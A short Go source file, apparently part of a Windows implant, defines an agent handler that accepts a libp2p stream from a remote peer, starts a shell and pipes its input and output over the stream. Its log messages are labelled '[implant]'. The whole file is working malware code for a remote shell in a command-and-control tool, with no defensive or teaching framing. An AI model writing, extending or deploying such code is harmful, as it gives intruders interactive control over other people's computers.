//go:build windows

package core

import (
	"encoding/binary"
	"io"
	"log"

	"github.com/libp2p/go-libp2p/core/network"
)

func (a *Agent) handleShellStream(s network.Stream) {
	defer s.Close()
	remotePeer := s.Conn().RemotePeer()

	var rows, cols uint16
	if err := binary.Read(s, binary.LittleEndian, &rows); err != nil {
		log.Printf("[implant] read shell rows: %v", err)
		return
	}
	if err := binary.Read(s, binary.LittleEndian, &cols); err != nil {
		log.Printf("[implant] read shell cols: %v", err)
		return
	}

	cmd := shellCommand()
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Printf("[implant] stdin pipe: %v", err)
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("[implant] stdout pipe: %v", err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Printf("[implant] stderr pipe: %v", err)
		return
	}

	if err := cmd.Start(); err != nil {
		log.Printf("[implant] start shell: %v", err)
		return
	}

	go io.Copy(stdin, s)
	go io.Copy(s, stdout)
	go io.Copy(s, stderr)

	cmd.Wait()
	log.Printf("[implant] shell session ended for %s", remotePeer.String())
}
